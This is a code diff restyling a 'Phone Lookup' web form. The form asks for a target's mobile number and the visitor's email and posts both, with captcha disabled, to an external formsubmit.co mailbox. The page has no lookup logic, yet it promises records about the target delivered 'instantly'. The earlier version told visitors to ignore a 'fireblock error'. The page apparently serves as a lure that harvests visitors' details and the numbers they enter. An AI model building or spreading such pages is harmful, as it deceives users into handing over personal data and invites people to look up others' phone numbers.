@@ -4,70 +4,146 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Phone Lookup</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
   <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Poppins', sans-serif;
+    }
+
     body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
     }
-    form {
-      background: white;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
-      width: 350px;
-    }
-    input[type="text"], input[type="email"] {
+
+    .form-container {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(15px);
+      border-radius: 16px;
+      padding: 40px 30px;
+      box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
       width: 100%;
-      padding: 12px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
+      max-width: 400px;
+      color: #fff;
+      text-align: center;
+    }
+
+    .form-container h2 {
+      margin-bottom: 20px;
+      font-weight: 600;
+    }
+
+    .note {
+      font-size: 14px;
+      background-color: rgba(255, 255, 255, 0.2);
+      border-left: 4px solid #ffcc00;
+      padding: 10px;
+      margin-bottom: 20px;
+      border-radius: 6px;
+      text-align: left;
+    }
+
+    .input-group {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+      background-color: rgba(255, 255, 255, 0.2);
+      padding: 10px;
       border-radius: 8px;
     }
-    input[type="submit"] {
-      background-color: #007BFF;
-      color: white;
-      padding: 12px;
+
+    .input-group i {
+      margin-right: 10px;
+      color: #fff;
+    }
+
+    .input-group input {
       width: 100%;
+      padding: 10px;
+      background: transparent;
+      border: none;
+      outline: none;
+      color: #fff;
+      font-size: 16px;
+    }
+
+    ::placeholder {
+      color: #eee;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #00c9a7;
+      color: #fff;
+      font-size: 16px;
       border: none;
       border-radius: 8px;
       cursor: pointer;
+      transition: background-color 0.3s ease;
     }
+
+    .submit-btn:hover {
+      background-color: #00b497;
+    }
+
     .message {
       margin-top: 15px;
-      color: green;
+      color: #d4ffdc;
       font-weight: bold;
       display: none;
     }
-    .note {
-      font-size: 14px;
-      background-color: #fff8dc;
-      border-left: 4px solid #ffa500;
-      padding: 10px;
-      margin-bottom: 20px;
-      color: #444;
+
+    @media screen and (max-width: 500px) {
+      .form-container {
+        margin: 20px;
+      }
     }
   </style>
 </head>
 <body>
-  <form action="https://formsubmit.co/thesecrec" method="POST" onsubmit="showMessage()">
-    <h2>Enter Details</h2>
+
+  <form class="form-container" action="https://formsubmit.co/thesecrec@proton.me" method="POST" onsubmit="showMessage()">
+    
+    <!-- Lottie Animation -->
+    <lottie-player 
+      src="https://assets1.lottiefiles.com/packages/lf20_zy4pqzsl.json"  
+      background="transparent"  
+      speed="1"  
+      style="width: 100px; height: 100px; margin: 0 auto;"  
+      loop  
+      autoplay>
+    </lottie-player>
+
+    <h2>📲 Phone Lookup Form</h2>
 
     <div class="note">
-      📢 <strong>Note:</strong> You will receive publicly available records only.  
-      This website does not share results here — we will send details only after you submit your email address along with the target number. Due to heavy traffic you see fireblock error, please ignore
+      📢 <strong>Note:</strong> You will receive publicly available records only.<br />
+      We send details only after you provide your email address along with the target number.
     </div>
 
-    <input type="text" name="phone_number" placeholder="Enter mobile number" required />
-    <input type="email" name="user_email" placeholder="Enter your email address" required />
+    <div class="input-group">
+      <i class="fas fa-phone"></i>
+      <input type="text" name="phone_number" placeholder="Enter mobile number" required />
+    </div>
+
+    <div class="input-group">
+      <i class="fas fa-envelope"></i>
+      <input type="email" name="user_email" placeholder="Enter your email address" required />
+    </div>
 
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_next" value="https://yourdomain.com/thanks.html" />
 
-    <input type="submit" value="Submit" />
+    <button type="submit" class="submit-btn">Submit</button>
+
     <p class="message" id="thanksMessage">Thanks for giving inputs. Results will come to your mail ID instantly.</p>
   </form>
 
